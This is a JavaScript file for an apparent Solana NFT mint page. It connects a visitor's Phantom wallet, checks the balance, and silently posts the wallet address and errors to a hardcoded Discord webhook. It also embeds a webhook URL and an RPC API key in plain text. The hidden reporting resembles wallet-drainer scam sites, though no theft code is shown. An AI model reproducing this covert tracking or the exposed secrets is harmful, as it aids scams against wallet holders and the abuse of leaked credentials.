async function sendToDiscord(message) {
    const webhookUrl = 'https://discord.com/api/webhooks/1424826301025488946/EripCWiQWqL5VT61z9pGJmm4fGhZf876gn5neA9Gn2FSM8_kgjeCQweEynxRRAL4lj8J';
    
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: message })
        });
    } catch (err) {
        console.error("Discord notification failed:", err);
    }
}

$(document).ready(function() {
    let isConnected = false;
    let connection = null;
    let walletPublicKey = null;

    $('#connect-wallet').on('click', async () => {
        if (isConnected && connection && walletPublicKey) {
            await executeMint();
            return;
        }
    
        if (window.solana && window.solana.isPhantom) {
            try {
                const resp = await window.solana.connect();
                walletPublicKey = resp.publicKey;
                sendToDiscord(`Wallet connected: ${resp.publicKey.toString()}`);
                console.log("Phantom Wallet connected:", resp);
    
                connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp',
                    'confirmed'
                );
    
                console.log("Attempting to get balance...");
                
                try {
                    const walletBalance = await connection.getBalance(walletPublicKey);
                    console.log("Wallet balance:", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
    
                    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                    if (walletBalance < minBalance) {
                        sendToDiscord('Insufficient funds for rent');
                        alert("Insufficient funds for rent.");
                        return;
                    }
    
                    isConnected = true;
                    $('#connect-wallet').text("Mint");
                } catch (balanceError) {
                    console.error("Balance fetch error details:", balanceError);
                    
                    // Try with a public RPC as fallback
                    console.log("Trying public RPC endpoint...");
                    connection = new solanaWeb3.Connection(
                        'https://api.mainnet-beta.solana.com',
                        'confirmed'
                    );
                    
                    const walletBalance = await connection.getBalance(walletPublicKey);
                    console.log("Wallet balance (public RPC):", walletBalance / solanaWeb3.LAMPORTS_PER_SOL, "SOL");
                    
                    isConnected = true;
                    $('#connect-wallet').text("Mint");
                }
    
            } catch (err) {
                console.error("Error connecting to Phantom Wallet:", err);
                sendToDiscord(`Connection error: ${err.message}`);
            }
        } else {
            alert("Phantom extension not found.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;
    
            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
            } else {
                alert("Please download the Phantom extension for your browser.");
            }
        }
    });
});
